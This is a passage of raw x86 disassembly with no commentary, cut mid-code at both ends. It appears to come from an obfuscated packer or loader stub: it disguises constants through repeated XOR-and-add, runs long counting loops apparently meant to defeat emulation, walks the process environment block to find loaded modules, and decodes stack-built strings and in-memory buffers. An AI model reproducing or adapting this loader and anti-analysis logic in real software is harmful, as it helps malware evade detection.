  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
